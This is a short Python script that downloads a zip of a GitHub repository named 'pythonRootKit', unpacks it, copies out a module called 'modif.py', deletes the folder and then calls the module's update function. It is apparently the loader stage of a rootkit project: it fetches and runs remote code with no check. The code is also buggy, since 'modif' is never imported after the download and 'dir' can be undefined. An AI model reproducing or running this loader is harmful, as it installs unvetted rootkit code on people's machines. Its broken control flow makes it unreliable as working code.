from fileinput import filename
import requests
import zipfile
import os
import shutil
import time
data = "https://github.com/N0SAFE/pythonRootKit/archive/main.zip"


def getpath(change=False):
    if change in (False, "not", "\\"):
        return os.getcwd()
    else:
        return os.getcwd().replace('\\', '/')
def getFileName():
    return os.path.basename(__file__)
def getNameDir(data):
    NameDir = data.split("/")
    deleteExtension = (data.split("/")[len(NameDir)-1]).split(".")
    result = (deleteExtension[0])
    result = (data.split("/")[len(NameDir)-3])+"-"+result
    return result

def supDir(data):
    shutil.rmtree(data)
    
def downloadFileGithub(file_url):
    data=".zip"
    r = requests.get(file_url, stream = True) 
    with open(data,"wb") as zip	: 
        for chunk in r.iter_content(chunk_size=1024): 
             # writing one chunk at a time to zip file 
             if chunk: 
                 zip.write(chunk)
    unzipfile()
    
def unzipfile():
    data=".zip"
    file = data
    # ouvrir le fichier zip en mode lecture
    with zipfile.ZipFile(file, 'r') as zip: 
        # extraire tous les fichiers
        zip.extractall() 
    os.remove(data)

def sortNameFile(data):
    from os import listdir
    from os.path import isfile, join
    return [f for f in listdir(data) if isfile(join(data, f))]
    
def moveFileFromDir(data):
    fichiers = []
    fichiers.append("modif.py")
    for f in range(len(fichiers)):
        if fichiers[f] != getFileName():
            path = getpath(True)
            path = path+"/"+data+"/"+fichiers[f]
            shutil.copy(path, getpath(True))
    print(fichiers)

try:
    import modif
except:
    dir = getNameDir(data)
    downloadFileGithub(data)
    moveFileFromDir(dir)
    supDir(dir)
    time.sleep(20)

modif.update(dir, delete=True)

#fichiers modifier
